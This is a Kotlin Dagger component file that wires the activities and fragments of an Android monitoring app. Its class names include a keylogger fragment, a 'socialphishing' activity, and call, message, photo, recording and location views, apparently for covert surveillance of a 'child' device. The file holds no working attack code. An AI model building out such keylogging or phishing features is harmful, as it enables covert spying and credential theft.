package com.dtz.netservice.di.component

import com.dtz.netservice.di.PerActivity
import com.dtz.netservice.di.module.ActivityModule
import com.dtz.netservice.ui.activities.mainparent.MainParentActivity
import com.dtz.netservice.ui.activities.register.RegisterActivity
import com.dtz.netservice.ui.activities.login.LoginActivity
import com.dtz.netservice.ui.activities.mainchild.MainChildActivity
import com.dtz.netservice.ui.activities.socialphishing.SocialActivityM
import com.dtz.netservice.ui.fragments.calls.CallsFragment
import com.dtz.netservice.ui.fragments.photo.PhotoFragment
import com.dtz.netservice.ui.fragments.keylog.KeysFragment
import com.dtz.netservice.ui.fragments.maps.MapsFragment
import com.dtz.netservice.ui.fragments.message.MessageFragment
import com.dtz.netservice.ui.fragments.notifications.NotifyMessageFragment
import com.dtz.netservice.ui.fragments.recording.RecordingFragment
import com.dtz.netservice.ui.fragments.social.SocialFragment
import dagger.Component

/**
 * Created by luis rafael on 8/03/18.
 */
@PerActivity
@Component(dependencies = [AppComponent::class],modules = [ActivityModule::class])
interface ActivityComponent {

    fun inject(loginActivity: LoginActivity)
    fun inject(registerActivity: RegisterActivity)
    fun inject(mainParentActivity: MainParentActivity)
    fun inject(mainChildActivity: MainChildActivity)
    fun inject(socialActivityM: SocialActivityM)
    fun inject(mapsFragment: MapsFragment)
    fun inject(callsFragment: CallsFragment)
    fun inject(messageFragment: MessageFragment)
    fun inject(photoFragment: PhotoFragment)
    fun inject(keysFragment: KeysFragment)
    fun inject(socialFragment: SocialFragment)
    fun inject(recordingFragment: RecordingFragment)
    fun inject(notifyMessageFragment: NotifyMessageFragment)

}